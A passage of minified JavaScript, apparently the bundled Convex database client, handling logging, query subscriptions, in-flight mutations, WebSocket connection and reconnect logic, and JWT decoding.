0;s++)n=Math.random().toString(36).substring(2,15);return this._onLogLineFuncs[n]=t,()=>{delete this._onLogLineFuncs[n]}}logVerbose(...t){if(this._verbose)for(const n of Object.values(this._onLogLineFuncs))n("debug",`${new Date().toISOString()}`,...t)}log(...t){for(const n of Object.values(this._onLogLineFuncs))n("info",...t)}warn(...t){for(const n of Object.values(this._onLogLineFuncs))n("warn",...t)}error(...t){for(const n of Object.values(this._onLogLineFuncs))n("error",...t)}}function xh(e){const t=new Cb(e);return t.addLogLineListener((n,...s)=>{switch(n){case"debug":console.debug(...s);break;case"info":console.log(...s);break;case"warn":console.warn(...s);break;case"error":console.error(...s);break;default:console.log(...s)}}),t}function kh(e){return new Cb(e)}function hn(e,t,n,s,r){const i=Tb(n);if(typeof r=="object"&&(r=`ConvexError ${JSON.stringify(r.errorData,null,2)}`),t==="info"){const o=r.match(/^\[.*?\] /);if(o===null){e.error(`[CONVEX ${i}(${s})] Could not parse console.log`);return}const a=r.slice(1,o[0].length-2),l=r.slice(o[0].length);e.log(`%c[CONVEX ${i}(${s})] [${a}]`,DR,l)}else e.error(`[CONVEX ${i}(${s})] ${r}`)}function _R(e,t){const n=`[CONVEX FATAL ERROR] ${t}`;return e.error(n),new Error(n)}function Os(e,t,n){return`[CONVEX ${Tb(e)}(${t})] ${n.errorMessage}
  Called by client`}function Mu(e,t){return t.data=e.errorData,t}function rs(e){const t=e.split(":");let n,s;return t.length===1?(n=t[0],s="default"):(n=t.slice(0,t.length-1).join(":"),s=t[t.length-1]),n.endsWith(".js")&&(n=n.slice(0,-3)),`${n}:${s}`}function Jn(e,t){return JSON.stringify({udfPath:rs(e),args:_e(t)})}function jm(e,t,n){const{initialNumItems:s,id:r}=n;return JSON.stringify({type:"paginated",udfPath:rs(e),args:_e(t),options:_e({initialNumItems:s,id:r})})}var FR=Object.defineProperty,BR=(e,t,n)=>t in e?FR(e,t,{enumerable:!0,configurable:!0,writable:!0,value:n}):e[t]=n,Tt=(e,t,n)=>BR(e,typeof t!="symbol"?t+"":t,n);class VR{constructor(){Tt(this,"nextQueryId"),Tt(this,"querySetVersion"),Tt(this,"querySet"),Tt(this,"queryIdToToken"),Tt(this,"identityVersion"),Tt(this,"auth"),Tt(this,"outstandingQueriesOlderThanRestart"),Tt(this,"outstandingAuthOlderThanRestart"),Tt(this,"paused"),Tt(this,"pendingQuerySetModifications"),this.nextQueryId=0,this.querySetVersion=0,this.identityVersion=0,this.querySet=new Map,this.queryIdToToken=new Map,this.outstandingQueriesOlderThanRestart=new Set,this.outstandingAuthOlderThanRestart=!1,this.paused=!1,this.pendingQuerySetModifications=new Map}hasSyncedPastLastReconnect(){return this.outstandingQueriesOlderThanRestart.size===0&&!this.outstandingAuthOlderThanRestart}markAuthCompletion(){this.outstandingAuthOlderThanRestart=!1}subscribe(t,n,s,r){const i=rs(t),o=Jn(i,n),a=this.querySet.get(o);if(a!==void 0)return a.numSubscribers+=1,{queryToken:o,modification:null,unsubscribe:()=>this.removeSubscriber(o)};{const l=this.nextQueryId++,c={id:l,canonicalizedUdfPath:i,args:n,numSubscribers:1,journal:s,componentPath:r};this.querySet.set(o,c),this.queryIdToToken.set(l,o);const u=this.querySetVersion,d=this.querySetVersion+1,h={type:"Add",queryId:l,udfPath:i,args:[_e(n)],journal:s,componentPath:r};return this.paused?this.pendingQuerySetModifications.set(l,h):this.querySetVersion=d,{queryToken:o,modification:{type:"ModifyQuerySet",baseVersion:u,newVersion:d,modifications:[h]},unsubscribe:()=>this.removeSubscriber(o)}}}transition(t){for(const n of t.modifications)switch(n.type){case"QueryUpdated":case"QueryFailed":{this.outstandingQueriesOlderThanRestart.delete(n.queryId);const s=n.journal;if(s!==void 0){const r=this.queryIdToToken.get(n.queryId);r!==void 0&&(this.querySet.get(r).journal=s)}break}case"QueryRemoved":{this.outstandingQueriesOlderThanRestart.delete(n.queryId);break}default:throw new Error(`Invalid modification ${n.type}`)}}queryId(t,n){const s=rs(t),r=Jn(s,n),i=this.querySet.get(r);return i!==void 0?i.id:null}isCurrentOrNewerAuthVersion(t){return t>=this.identityVersion}getAuth(){return this.auth}setAuth(t){this.auth={tokenType:"User",value:t};const n=this.identityVersion;return this.paused||(this.identityVersion=n+1),{type:"Authenticate",baseVersion:n,...this.auth}}setAdminAuth(t,n){const s={tokenType:"Admin",value:t,impersonating:n};this.auth=s;const r=this.identityVersion;return this.paused||(this.identityVersion=r+1),{type:"Authenticate",baseVersion:r,...s}}clearAuth(){this.auth=void 0,this.markAuthCompletion();const t=this.identityVersion;return this.paused||(this.identityVersion=t+1),{type:"Authenticate",tokenType:"None",baseVersion:t}}hasAuth(){return!!this.auth}isNewAuth(t){var n;return((n=this.auth)==null?void 0:n.value)!==t}queryPath(t){const n=this.queryIdToToken.get(t);return n?this.querySet.get(n).canonicalizedUdfPath:null}queryArgs(t){const n=this.queryIdToToken.get(t);return n?this.querySet.get(n).args:null}queryToken(t){return this.queryIdToToken.get(t)??null}queryJournal(t){var n;return(n=this.querySet.get(t))==null?void 0:n.journal}restart(){this.unpause(),this.outstandingQueriesOlderThanRestart.clear();const t=[];for(const r of this.querySet.values()){const i={type:"Add",queryId:r.id,udfPath:r.canonicalizedUdfPath,args:[_e(r.args)],journal:r.journal,componentPath:r.componentPath};t.push(i),this.outstandingQueriesOlderThanRestart.add(r.id)}this.querySetVersion=1;const n={type:"ModifyQuerySet",baseVersion:0,newVersion:1,modifications:t};if(!this.auth)return this.identityVersion=0,[n,void 0];this.outstandingAuthOlderThanRestart=!0;const s={type:"Authenticate",baseVersion:0,...this.auth};return this.identityVersion=1,[n,s]}pause(){this.paused=!0}resume(){const t=this.pendingQuerySetModifications.size>0?{type:"ModifyQuerySet",baseVersion:this.querySetVersion,newVersion:++this.querySetVersion,modifications:Array.from(this.pendingQuerySetModifications.values())}:void 0,n=this.auth!==void 0?{type:"Authenticate",baseVersion:this.identityVersion++,...this.auth}:void 0;return this.unpause(),[t,n]}unpause(){this.paused=!1,this.pendingQuerySetModifications.clear()}removeSubscriber(t){const n=this.querySet.get(t);if(n.numSubscribers>1)return n.numSubscribers-=1,null;{this.querySet.delete(t),this.queryIdToToken.delete(n.id),this.outstandingQueriesOlderThanRestart.delete(n.id);const s=this.querySetVersion,r=this.querySetVersion+1,i={type:"Remove",queryId:n.id};return this.paused?this.pendingQuerySetModifications.has(n.id)?this.pendingQuerySetModifications.delete(n.id):this.pendingQuerySetModifications.set(n.id,i):this.querySetVersion=r,{type:"ModifyQuerySet",baseVersion:s,newVersion:r,modifications:[i]}}}}var WR=Object.defineProperty,UR=(e,t,n)=>t in e?WR(e,t,{enumerable:!0,configurable:!0,writable:!0,value:n}):e[t]=n,lo=(e,t,n)=>UR(e,typeof t!="symbol"?t+"":t,n);class zR{constructor(t,n){this.logger=t,this.markConnectionStateDirty=n,lo(this,"inflightRequests"),lo(this,"requestsOlderThanRestart"),lo(this,"inflightMutationsCount",0),lo(this,"inflightActionsCount",0),this.inflightRequests=new Map,this.requestsOlderThanRestart=new Set}request(t,n){const s=new Promise(r=>{const i=n?"Requested":"NotSent";this.inflightRequests.set(t.requestId,{message:t,status:{status:i,requestedAt:new Date,onResult:r}}),t.type==="Mutation"?this.inflightMutationsCount++:t.type==="Action"&&this.inflightActionsCount++});return this.markConnectionStateDirty(),s}onResponse(t){const n=this.inflightRequests.get(t.requestId);if(n===void 0||n.status.status==="Completed")return null;const s=n.message.type==="Mutation"?"mutation":"action",r=n.message.udfPath;for(const l of t.logLines)hn(this.logger,"info",s,r,l);const i=n.status;let o,a;if(t.success)o={success:!0,logLines:t.logLines,value:wt(t.result)},a=()=>i.onResult(o);else{const l=t.result,{errorData:c}=t;hn(this.logger,"error",s,r,l),o={success:!1,errorMessage:l,errorData:c!==void 0?wt(c):void 0,logLines:t.logLines},a=()=>i.onResult(o)}return t.type==="ActionResponse"||!t.success?(a(),this.inflightRequests.delete(t.requestId),this.requestsOlderThanRestart.delete(t.requestId),n.message.type==="Action"?this.inflightActionsCount--:n.message.type==="Mutation"&&this.inflightMutationsCount--,this.markConnectionStateDirty(),{requestId:t.requestId,result:o}):(n.status={status:"Completed",result:o,ts:t.ts,onResolve:a},null)}removeCompleted(t){const n=new Map;for(const[s,r]of this.inflightRequests.entries()){const i=r.status;i.status==="Completed"&&i.ts.lessThanOrEqual(t)&&(i.onResolve(),n.set(s,i.result),r.message.type==="Mutation"?this.inflightMutationsCount--:r.message.type==="Action"&&this.inflightActionsCount--,this.inflightRequests.delete(s),this.requestsOlderThanRestart.delete(s))}return n.size>0&&this.markConnectionStateDirty(),n}restart(){this.requestsOlderThanRestart=new Set(this.inflightRequests.keys());const t=[];for(const[n,s]of this.inflightRequests){if(s.status.status==="NotSent"){s.status.status="Requested",t.push(s.message);continue}if(s.message.type==="Mutation")t.push(s.message);else if(s.message.type==="Action"){if(this.inflightRequests.delete(n),this.requestsOlderThanRestart.delete(n),this.inflightActionsCount--,s.status.status==="Completed")throw new Error("Action should never be in 'Completed' state");s.status.onResult({success:!1,errorMessage:"Connection lost while action was in flight",logLines:[]})}}return this.markConnectionStateDirty(),t}resume(){const t=[];for(const[,n]of this.inflightRequests)if(n.status.status==="NotSent"){n.status.status="Requested",t.push(n.message);continue}return t}hasIncompleteRequests(){for(const t of this.inflightRequests.values())if(t.status.status==="Requested")return!0;return!1}hasInflightRequests(){return this.inflightRequests.size>0}hasSyncedPastLastReconnect(){return this.requestsOlderThanRestart.size===0}timeOfOldestInflightRequest(){if(this.inflightRequests.size===0)return null;let t=Date.now();for(const n of this.inflightRequests.values())n.status.status!=="Completed"&&n.status.requestedAt.getTime()<t&&(t=n.status.requestedAt.getTime());return new Date(t)}inflightMutations(){return this.inflightMutationsCount}inflightActions(){return this.inflightActionsCount}}const gi=Symbol.for("functionName"),Ab=Symbol.for("toReferencePath");function $R(e){return e[Ab]??null}function HR(e){return e.startsWith("function://")}function QR(e){let t;if(typeof e=="string")HR(e)?t={functionHandle:e}:t={name:e};else if(e[gi])t={name:e[gi]};else{const n=$R(e);if(!n)throw new Error(`${e} is not a functionReference`);t={reference:n}}return t}function ye(e){const t=QR(e);if(t.name===void 0)throw t.functionHandle!==void 0?new Error(`Expected function reference like "api.file.func" or "internal.file.func", but received function handle ${t.functionHandle}`):t.reference!==void 0?new Error(`Expected function reference in the current component like "api.file.func" or "internal.file.func", but received reference ${t.reference}`):new Error(`Expected function reference like "api.file.func" or "internal.file.func", but received ${JSON.stringify(t)}`);if(typeof e=="string")return e;const n=e[gi];if(!n)throw new Error(`${e} is not a functionReference`);return n}function Eb(e){return{[gi]:e}}function Rb(e=[]){const t={get(n,s){if(typeof s=="string"){const r=[...e,s];return Rb(r)}else if(s===gi){if(e.length<2){const o=["api",...e].join(".");throw new Error(`API path is expected to be of the form \`api.moduleName.functionName\`. Found: \`${o}\``)}const r=e.slice(0,-1).join("/"),i=e[e.length-1];return i==="default"?r:r+":"+i}else return s===Symbol.toStringTag?"FunctionReference":void 0}};return new Proxy({},t)}const GR=Rb();var KR=Object.defineProperty,YR=(e,t,n)=>t in e?KR(e,t,{enumerable:!0,configurable:!0,writable:!0,value:n}):e[t]=n,Ta=(e,t,n)=>YR(e,typeof t!="symbol"?t+"":t,n);class yi{constructor(t){Ta(this,"queryResults"),Ta(this,"modifiedQueries"),this.queryResults=t,this.modifiedQueries=[]}getQuery(t,...n){const s=Le(n[0]),r=ye(t),i=this.queryResults.get(Jn(r,s));if(i!==void 0)return yi.queryValue(i.result)}getAllQueries(t){const n=[],s=ye(t);for(const r of this.queryResults.values())r.udfPath===rs(s)&&n.push({args:r.args,value:yi.queryValue(r.result)});return n}setQuery(t,n,s){const r=Le(n),i=ye(t),o=Jn(i,r);let a;s===void 0?a=void 0:a={success:!0,value:s,logLines:[]};const l={udfPath:i,args:r,result:a};this.queryResults.set(o,l),this.modifiedQueries.push(o)}static queryValue(t){if(t!==void 0)return t.success?t.value:void 0}}class XR{constructor(){Ta(this,"queryResults"),Ta(this,"optimisticUpdates"),this.queryResults=new Map,this.optimisticUpdates=[]}ingestQueryResultsFromServer(t,n){this.optimisticUpdates=this.optimisticUpdates.filter(o=>!n.has(o.mutationId));const s=this.queryResults;this.queryResults=new Map(t);const r=new yi(this.queryResults);for(const o of this.optimisticUpdates)o.update(r);const i=[];for(const[o,a]of this.queryResults){const l=s.get(o);(l===void 0||l.result!==a.result)&&i.push(o)}return i}applyOptimisticUpdate(t,n){this.optimisticUpdates.push({update:t,mutationId:n});const s=new yi(this.queryResults);return t(s),s.modifiedQueries}rawQueryResult(t){const n=this.queryResults.get(t);if(n!==void 0)return n.result}queryResult(t){const n=this.queryResults.get(t);if(n===void 0)return;const s=n.result;if(s!==void 0){if(s.success)return s.value;throw s.errorData!==void 0?Mu(s,new $n(Os("query",n.udfPath,s))):new Error(Os("query",n.udfPath,s))}}hasQueryResult(t){return this.queryResults.get(t)!==void 0}queryLogs(t){var s;const n=this.queryResults.get(t);return(s=n==null?void 0:n.result)==null?void 0:s.logLines}}var JR=Object.defineProperty,ZR=(e,t,n)=>t in e?JR(e,t,{enumerable:!0,configurable:!0,writable:!0,value:n}):e[t]=n,Xl=(e,t,n)=>ZR(e,typeof t!="symbol"?t+"":t,n);class je{constructor(t,n){Xl(this,"low"),Xl(this,"high"),Xl(this,"__isUnsignedLong__"),this.low=t|0,this.high=n|0,this.__isUnsignedLong__=!0}static isLong(t){return(t&&t.__isUnsignedLong__)===!0}static fromBytesLE(t){return new je(t[0]|t[1]<<8|t[2]<<16|t[3]<<24,t[4]|t[5]<<8|t[6]<<16|t[7]<<24)}toBytesLE(){const t=this.high,n=this.low;return[n&255,n>>>8&255,n>>>16&255,n>>>24,t&255,t>>>8&255,t>>>16&255,t>>>24]}static fromNumber(t){return isNaN(t)||t<0?Mm:t>=e2?t2:new je(t%Ur|0,t/Ur|0)}toString(){return(BigInt(this.high)*BigInt(Ur)+BigInt(this.low)).toString()}equals(t){return je.isLong(t)||(t=je.fromValue(t)),this.high>>>31===1&&t.high>>>31===1?!1:this.high===t.high&&this.low===t.low}notEquals(t){return!this.equals(t)}comp(t){return je.isLong(t)||(t=je.fromValue(t)),this.equals(t)?0:t.high>>>0>this.high>>>0||t.high===this.high&&t.low>>>0>this.low>>>0?-1:1}lessThanOrEqual(t){return this.comp(t)<=0}static fromValue(t){return typeof t=="number"?je.fromNumber(t):new je(t.low,t.high)}}const Mm=new je(0,0),Lm=65536,Ur=Lm*Lm,e2=Ur*Ur,t2=new je(-1,-1);var n2=Object.defineProperty,s2=(e,t,n)=>t in e?n2(e,t,{enumerable:!0,configurable:!0,writable:!0,value:n}):e[t]=n,co=(e,t,n)=>s2(e,typeof t!="symbol"?t+"":t,n);class Dm{constructor(t,n){co(this,"version"),co(this,"remoteQuerySet"),co(this,"queryPath"),co(this,"logger"),this.version={querySet:0,ts:je.fromNumber(0),identity:0},this.remoteQuerySet=new Map,this.queryPath=t,this.logger=n}transition(t){const n=t.startVersion;if(this.version.querySet!==n.querySet||this.version.ts.notEquals(n.ts)||this.version.identity!==n.identity)throw new Error(`Invalid start version: ${n.ts.toString()}:${n.querySet}:${n.identity}, transitioning from ${this.version.ts.toString()}:${this.version.querySet}:${this.version.identity}`);for(const s of t.modifications)switch(s.type){case"QueryUpdated":{const r=this.queryPath(s.queryId);if(r)for(const o of s.logLines)hn(this.logger,"info","query",r,o);const i=wt(s.value??null);this.remoteQuerySet.set(s.queryId,{success:!0,value:i,logLines:s.logLines});break}case"QueryFailed":{const r=this.queryPath(s.queryId);if(r)for(const o of s.logLines)hn(this.logger,"info","query",r,o);const{errorData:i}=s;this.remoteQuerySet.set(s.queryId,{success:!1,errorMessage:s.errorMessage,errorData:i!==void 0?wt(i):void 0,logLines:s.logLines});break}case"QueryRemoved":{this.remoteQuerySet.delete(s.queryId);break}default:throw new Error(`Invalid modification ${s.type}`)}this.version=t.endVersion}remoteQueryResults(){return this.remoteQuerySet}timestamp(){return this.version.ts}}function Jl(e){const t=fi(e);return je.fromBytesLE(Array.from(t))}function r2(e){const t=new Uint8Array(e.toBytesLE());return mi(t)}function _m(e){switch(e.type){case"FatalError":case"AuthError":case"ActionResponse":case"TransitionChunk":case"Ping":return{...e};case"MutationResponse":return e.success?{...e,ts:Jl(e.ts)}:{...e};case"Transition":return{...e,startVersion:{...e.startVersion,ts:Jl(e.startVersion.ts)},endVersion:{...e.endVersion,ts:Jl(e.endVersion.ts)}}}}function i2(e){switch(e.type){case"Authenticate":case"ModifyQuerySet":case"Mutation":case"Action":case"Event":return{...e};case"Connect":return e.maxObservedTimestamp!==void 0?{...e,maxObservedTimestamp:r2(e.maxObservedTimestamp)}:{...e,maxObservedTimestamp:void 0}}}var o2=Object.defineProperty,a2=(e,t,n)=>t in e?o2(e,t,{enumerable:!0,configurable:!0,writable:!0,value:n}):e[t]=n,ae=(e,t,n)=>a2(e,typeof t!="symbol"?t+"":t,n);const l2=1e3,c2=1001,u2=1005,d2=4040;let _o;function fs(){return _o===void 0&&(_o=Date.now()),typeof performance>"u"||!performance.now?Date.now():Math.round(_o+performance.now())}function Fm(){return`t=${Math.round((fs()-_o)/100)/10}s`}const Pb={InternalServerError:{timeout:1e3},SubscriptionsWorkerFullError:{timeout:3e3},TooManyConcurrentRequests:{timeout:3e3},CommitterFullError:{timeout:3e3},AwsTooManyRequestsException:{timeout:3e3},ExecuteFullError:{timeout:3e3},SystemTimeoutError:{timeout:3e3},ExpiredInQueue:{timeout:3e3},VectorIndexesUnavailable:{timeout:1e3},SearchIndexesUnavailable:{timeout:1e3},TableSummariesUnavailable:{timeout:1e3},VectorIndexTooLarge:{timeout:3e3},SearchIndexTooLarge:{timeout:3e3},TooManyWritesInTimePeriod:{timeout:3e3}};function h2(e){if(e===void 0)return"Unknown";for(const t of Object.keys(Pb))if(e.startsWith(t))return t;return"Unknown"}class p2{constructor(t,n,s,r,i,o){this.markConnectionStateDirty=i,this.debug=o,ae(this,"socket"),ae(this,"connectionCount"),ae(this,"_hasEverConnected",!1),ae(this,"lastCloseReason"),ae(this,"transitionChunkBuffer",null),ae(this,"defaultInitialBackoff"),ae(this,"maxBackoff"),ae(this,"retries"),ae(this,"serverInactivityThreshold"),ae(this,"reconnectDueToServerInactivityTimeout"),ae(this,"scheduledReconnect",null),ae(this,"networkOnlineHandler",null),ae(this,"pendingNetworkRecoveryInfo",null),ae(this,"uri"),ae(this,"onOpen"),ae(this,"onResume"),ae(this,"onMessage"),ae(this,"webSocketConstructor"),ae(this,"logger"),ae(this,"onServerDisconnectError"),this.webSocketConstructor=s,this.socket={state:"disconnected"},this.connectionCount=0,this.lastCloseReason="InitialConnect",this.defaultInitialBackoff=1e3,this.maxBackoff=16e3,this.retries=0,this.serverInactivityThreshold=6e4,this.reconnectDueToServerInactivityTimeout=null,this.uri=t,this.onOpen=n.onOpen,this.onResume=n.onResume,this.onMessage=n.onMessage,this.onServerDisconnectError=n.onServerDisconnectError,this.logger=r,this.setupNetworkListener(),this.connect()}setSocketState(t){this.socket=t,this._logVerbose(`socket state changed: ${this.socket.state}, paused: ${"paused"in this.socket?this.socket.paused:void 0}`),this.markConnectionStateDirty()}setupNetworkListener(){typeof window>"u"||typeof window.addEventListener!="function"||this.networkOnlineHandler===null&&(this.networkOnlineHandler=()=>{this._logVerbose("network online event detected"),this.tryReconnectImmediately()},window.addEventListener("online",this.networkOnlineHandler),this._logVerbose("network online event listener registered"))}cleanupNetworkListener(){this.networkOnlineHandler&&typeof window<"u"&&typeof window.removeEventListener=="function"&&(window.removeEventListener("online",this.networkOnlineHandler),this.networkOnlineHandler=null,this._logVerbose("network online event listener removed"))}assembleTransition(t){if(t.partNumber<0||t.partNumber>=t.totalParts||t.totalParts===0||this.transitionChunkBuffer&&(this.transitionChunkBuffer.totalParts!==t.totalParts||this.transitionChunkBuffer.transitionId!==t.transitionId))throw this.transitionChunkBuffer=null,new Error("Invalid TransitionChunk");if(this.transitionChunkBuffer===null&&(this.transitionChunkBuffer={chunks:[],totalParts:t.totalParts,transitionId:t.transitionId}),t.partNumber!==this.transitionChunkBuffer.chunks.length){const n=this.transitionChunkBuffer.chunks.length;throw this.transitionChunkBuffer=null,new Error(`TransitionChunk received out of order: expected part ${n}, got ${t.partNumber}`)}if(this.transitionChunkBuffer.chunks.push(t.chunk),this.transitionChunkBuffer.chunks.length===t.totalParts){const n=this.transitionChunkBuffer.chunks.join("");this.transitionChunkBuffer=null;const s=_m(JSON.parse(n));if(s.type!=="Transition")throw new Error(`Expected Transition, got ${s.type} after assembling chunks`);return s}return null}connect(){if(this.socket.state==="terminated")return;if(this.socket.state!=="disconnected"&&this.socket.state!=="stopped")throw new Error("Didn't start connection from disconnected state: "+this.socket.state);const t=new this.webSocketConstructor(this.uri);this._logVerbose("constructed WebSocket"),this.setSocketState({state:"connecting",ws:t,paused:"no"}),this.resetServerInactivityTimeout(),t.onopen=()=>{if(this.logger.logVerbose("begin ws.onopen"),this.socket.state!=="connecting")throw new Error("onopen called with socket not in connecting state");if(this.setSocketState({state:"ready",ws:t,paused:this.socket.paused==="yes"?"uninitialized":"no"}),this.resetServerInactivityTimeout(),this.socket.paused==="no"&&(this._hasEverConnected=!0,this.onOpen({connectionCount:this.connectionCount,lastCloseReason:this.lastCloseReason,clientTs:fs()})),this.lastCloseReason!=="InitialConnect"&&(this.lastCloseReason?this.logger.log("WebSocket reconnected at",Fm(),"after disconnect due to",this.lastCloseReason):this.logger.log("WebSocket reconnected at",Fm())),this.connectionCount+=1,this.lastCloseReason=null,this.pendingNetworkRecoveryInfo!==null){const{timeSavedMs:n}=this.pendingNetworkRecoveryInfo;this.pendingNetworkRecoveryInfo=null,this.sendMessage({type:"Event",eventType:"NetworkRecoveryReconnect",event:{timeSavedMs:n}}),this.logger.log(`Network recovery reconnect saved ~${Math.round(n/1e3)}s of waiting`)}},t.onerror=n=>{this.transitionChunkBuffer=null;const s=n.message;s&&this.logger.log(`WebSocket error message: ${s}`)},t.onmessage=n=>{this.resetServerInactivityTimeout();const s=n.data.length;let r=_m(JSON.parse(n.data));if(this._logVerbose(`received ws message with type ${r.type}`),r.type==="Ping")return;if(r.type==="TransitionChunk"){const o=this.assembleTransition(r);if(!o)return;r=o,this._logVerbose(`assembled full ws message of type ${r.type}`)}this.transitionChunkBuffer!==null&&(this.transitionChunkBuffer=null,this.logger.log(`Received unexpected ${r.type} while buffering TransitionChunks`)),r.type==="Transition"&&this.reportLargeTransition({messageLength:s,transition:r}),this.onMessage(r).hasSyncedPastLastReconnect&&(this.retries=0,this.markConnectionStateDirty())},t.onclose=n=>{if(this._logVerbose("begin ws.onclose"),this.transitionChunkBuffer=null,this.lastCloseReason===null&&(this.lastCloseReason=n.reason||`closed with code ${n.code}`),n.code!==l2&&n.code!==c2&&n.code!==u2&&n.code!==d2){let r=`WebSocket closed with code ${n.code}`;n.reason&&(r+=`: ${n.reason}`),this.logger.log(r),this.onServerDisconnectError&&n.reason&&this.onServerDisconnectError(r)}const s=h2(n.reason);this.scheduleReconnect(s)}}socketState(){return this.socket.state}sendMessage(t){const n={type:t.type,...t.type==="Authenticate"&&t.tokenType==="User"?{value:`...${t.value.slice(-7)}`}:{}};if(this.socket.state==="ready"&&this.socket.paused==="no"){const s=i2(t),r=JSON.stringify(s);let i=!1;try{this.socket.ws.send(r),i=!0}catch(o){this.logger.log(`Failed to send message on WebSocket, reconnecting: ${o}`),this.closeAndReconnect("FailedToSendMessage")}return this._logVerbose(`${i?"sent":"failed to send"} message with type ${t.type}: ${JSON.stringify(n)}`),!0}return this._logVerbose(`message not sent (socket state: ${this.socket.state}, paused: ${"paused"in this.socket?this.socket.paused:void 0}): ${JSON.stringify(n)}`),!1}resetServerInactivityTimeout(){this.socket.state!=="terminated"&&(this.reconnectDueToServerInactivityTimeout!==null&&(clearTimeout(this.reconnectDueToServerInactivityTimeout),this.reconnectDueToServerInactivityTimeout=null),this.reconnectDueToServerInactivityTimeout=setTimeout(()=>{this.closeAndReconnect("InactiveServer")},this.serverInactivityThreshold))}scheduleReconnect(t){this.scheduledReconnect&&(clearTimeout(this.scheduledReconnect.timeout),this.scheduledReconnect=null),this.socket={state:"disconnected"};const n=this.nextBackoff(t);this.markConnectionStateDirty(),this.logger.log(`Attempting reconnect in ${Math.round(n)}ms`);const s=fs(),r=setTimeout(()=>{var i;((i=this.scheduledReconnect)==null?void 0:i.timeout)===r&&(this.scheduledReconnect=null,this.connect())},n);this.scheduledReconnect={timeout:r,scheduledAt:s,backoffMs:n}}closeAndReconnect(t){switch(this._logVerbose(`begin closeAndReconnect with reason ${t}`),this.socket.state){case"disconnected":case"terminated":case"stopped":return;case"connecting":case"ready":{this.lastCloseReason=t,this.close(),this.scheduleReconnect("client");return}default:this.socket}}close(){switch(this.transitionChunkBuffer=null,this.socket.state){case"disconnected":case"terminated":case"stopped":return Promise.resolve();case"connecting":{const t=this.socket.ws;return t.onmessage=n=>{this._logVerbose("Ignoring message received after close")},new Promise(n=>{t.onclose=()=>{this._logVerbose("Closed after connecting"),n()},t.onopen=()=>{this._logVerbose("Opened after connecting"),t.close()}})}case"ready":{this._logVerbose("ws.close called");const t=this.socket.ws;t.onmessage=s=>{this._logVerbose("Ignoring message received after close")};const n=new Promise(s=>{t.onclose=()=>{s()}});return t.close(),n}default:return this.socket,Promise.resolve()}}terminate(){switch(this.reconnectDueToServerInactivityTimeout&&clearTimeout(this.reconnectDueToServerInactivityTimeout),this.scheduledReconnect&&(clearTimeout(this.scheduledReconnect.timeout),this.scheduledReconnect=null),this.cleanupNetworkListener(),this.socket.state){case"terminated":case"stopped":case"disconnected":case"connecting":case"ready":{const t=this.close();return this.setSocketState({state:"terminated"}),t}default:throw this.socket,new Error(`Invalid websocket state: ${this.socket.state}`)}}stop(){switch(this.socket.state){case"terminated":return Promise.resolve();case"connecting":case"stopped":case"disconnected":case"ready":{this.cleanupNetworkListener();const t=this.close();return this.socket={state:"stopped"},t}default:return this.socket,Promise.resolve()}}tryRestart(){switch(this.socket.state){case"stopped":break;case"terminated":case"connecting":case"ready":case"disconnected":this.logger.logVerbose("Restart called without stopping first");return;default:this.socket}this.setupNetworkListener(),this.connect()}pause(){switch(this.socket.state){case"disconnected":case"stopped":case"terminated":return;case"connecting":case"ready":{this.socket={...this.socket,paused:"yes"};return}default:{this.socket;return}}}tryReconnectImmediately(){if(this._logVerbose("tryReconnectImmediately called"),this.socket.state!=="disconnected"){this._logVerbose(`tryReconnectImmediately called but socket state is ${this.socket.state}, no action taken`);return}let t=null;if(this.scheduledReconnect){const n=fs()-this.scheduledReconnect.scheduledAt;t=Math.max(0,this.scheduledReconnect.backoffMs-n),this._logVerbose(`would have waited ${Math.round(t)}ms more (backoff was ${Math.round(this.scheduledReconnect.backoffMs)}ms, elapsed ${Math.round(n)}ms)`),clearTimeout(this.scheduledReconnect.timeout),this.scheduledReconnect=null,this._logVerbose("canceled scheduled reconnect")}this.logger.log("Network recovery detected, reconnecting immediately"),this.pendingNetworkRecoveryInfo=t!==null?{timeSavedMs:t}:null,this.connect()}resume(){switch(this.socket.state){case"connecting":this.socket={...this.socket,paused:"no"};return;case"ready":this.socket.paused==="uninitialized"?(this.socket={...this.socket,paused:"no"},this._hasEverConnected=!0,this.onOpen({connectionCount:this.connectionCount,lastCloseReason:this.lastCloseReason,clientTs:fs()})):this.socket.paused==="yes"&&(this.socket={...this.socket,paused:"no"},this.onResume());return;case"terminated":case"stopped":case"disconnected":return;default:this.socket}this.connect()}connectionState(){return{isConnected:this.socket.state==="ready",hasEverConnected:this._hasEverConnected,connectionCount:this.connectionCount,connectionRetries:this.retries}}_logVerbose(t){this.logger.logVerbose(t)}nextBackoff(t){const s=(t==="client"?100:t==="Unknown"?this.defaultInitialBackoff:Pb[t].timeout)*Math.pow(2,this.retries);this.retries+=1;const r=Math.min(s,this.maxBackoff),i=r*(Math.random()-.5);return r+i}reportLargeTransition({transition:t,messageLength:n}){if(t.clientClockSkew===void 0||t.serverTs===void 0)return;const s=fs()-t.clientClockSkew-t.serverTs/1e6,r=`${Math.round(s)}ms`,i=`${Math.round(n/1e4)/100}MB`,o=n/(s/1e3),a=`${Math.round(o/1e4)/100}MB per second`;this._logVerbose(`received ${i} transition in ${r} at ${a}`),n>2e7?this.logger.log(`received query results totaling more that 20MB (${i}) which will take a long time to download on slower connections`):s>2e4&&this.logger.log(`received query results totaling ${i} which took more than 20s to arrive (${r})`),this.debug&&this.sendMessage({type:"Event",eventType:"ClientReceivedTransition",event:{transitionTransitTime:s,messageLength:n}})}}function f2(){return m2()}function m2(){return"xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g,e=>{const t=Math.random()*16|0;return(e==="x"?t:t&3|8).toString(16)})}class Ar extends Error{}Ar.prototype.name="InvalidTokenError";function g2(e){return decodeURIComponent(atob(e).replace(/(.)/g,(t,n)=>{let s=n.charCodeAt(0).toString(16).toUpperCase();return s.length<2&&(s="0"+s),"%"+s}))}function y2(e){let t=e.replace(/-/g,"+").replace(/_/g,"/");switch(t.length%4){case 0:break;case 2:t+="==";break;case 3:t+="=";break;default:throw new Error("base64 string is not of the correct length")}try{return g2(t)}catch{return atob(t)}}function qb(e,t){if(typeof e!="string")throw new Ar("Invalid token specified: must be a string");t||(t={});const n=t.header===!0?0:1,s=e.split(".")[n];if(typeof s!="string")throw new Ar(`Invalid token specified: missing part #${n+1}`);let r;try{r=y2(s)}catch(i){throw new Ar(`Invalid token specified: invalid base64 for part #${n+1} (${i.message})`)}try{return JSON.parse(r)}catch(i){throw new Ar(`Invalid token specified: invalid json for part #${n+1} (${i.message})`)}}var w2=Object.defineProperty,v2=(e,t,n)=>t in 